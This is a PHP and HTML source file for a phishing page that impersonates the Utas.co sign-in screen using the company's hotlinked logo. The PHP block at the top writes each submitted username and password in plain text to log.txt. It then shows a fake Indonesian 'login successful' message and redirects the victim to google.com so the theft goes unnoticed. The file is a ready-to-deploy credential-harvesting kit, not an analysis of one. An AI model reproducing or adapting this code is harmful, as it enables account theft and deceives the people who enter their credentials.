<?php
$log_file = 'log.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $log_entry = "[" . date('Y-m-d H:i:s') . "] Username: $username | Password: $password\n";

    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

   echo '<script>
        document.body.innerHTML = "<div class=\'bg-green-500 text-white p-3 rounded text-center\'>Berhasil login, tunggu informasi selanjutnya akan di informasikan di email anda...</div>";
        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 2000);
    </script>';
    exit();
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
</head>
<body class="bg-gradient-to-b from-blue-100 to-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-sm p-6 bg-white rounded-lg shadow-md">
        
        <!-- LOGO -->
        <div class="flex justify-center mb-6">
            <img src="https://app.utas.co/assets/images/utas-logo.svg" alt="Utas.co" class="h-16 w-auto">
        </div>
        
        <h2 class="text-center text-2xl font-semibold text-gray-700 mb-6">Sign in</h2>
        
        <form method="POST">
            <div class="mb-4">
                <label class="block text-gray-700" for="username">Username or Email</label>
                <input class="w-full px-4 py-2 mt-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
                       id="username" name="username" placeholder="Username or Email" type="text" required/>
            </div>
            <div class="mb-4">
                <label class="block text-gray-700" for="password">Password</label>
                <input class="w-full px-4 py-2 mt-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
                       id="password" name="password" placeholder="Password" type="password" required/>
            </div>
            <button class="w-full px-4 py-2 text-white bg-blue-500 rounded-lg hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400" type="submit">
                Sign In
            </button>
        </form>
    </div>
</body>
</html>
